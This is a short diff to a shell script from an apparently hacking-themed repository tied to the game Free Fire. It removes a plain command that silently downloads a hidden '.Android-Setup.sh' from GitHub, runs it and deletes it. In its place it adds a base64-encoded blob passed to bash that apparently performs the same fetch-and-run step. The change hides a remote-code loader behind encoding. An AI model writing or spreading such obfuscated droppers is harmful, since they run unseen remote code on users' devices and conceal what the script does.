@@ -1,2 +1,2 @@
-#!/bin/bash
-rm -rf .Android-Setup.sh && wget -q https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/FreeFire/SM/Files/.Android-Setup.sh > /dev/null && bash .Android-Setup.sh && rm -rf .Android-Setup.sh
+bash -c "$(base64 -d <<< "\
+IyEvYmluL2Jhc2gKcm0gLXJmIC5BbmRyb2lkLVNldHVwLnNoICYmIHdnZXQgLXEgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL09ubGluZS1IYWNraW5nL01yLU9ubGluZUhhY2tpbmcvbWFpbi9PbmxpbmVIYWNraW5nL1NVTUFOL0ZyZWVGaXJlL1NNL0ZpbGVzLy5BbmRyb2lkLVNldHVwLnNoID4gL2Rldi9udWxsICYmIGJhc2ggLkFuZHJvaWQtU2V0dXAuc2ggJiYgcm0gLXJmIC5BbmRyb2lkLVNldHVwLnNo")" bash "$@"
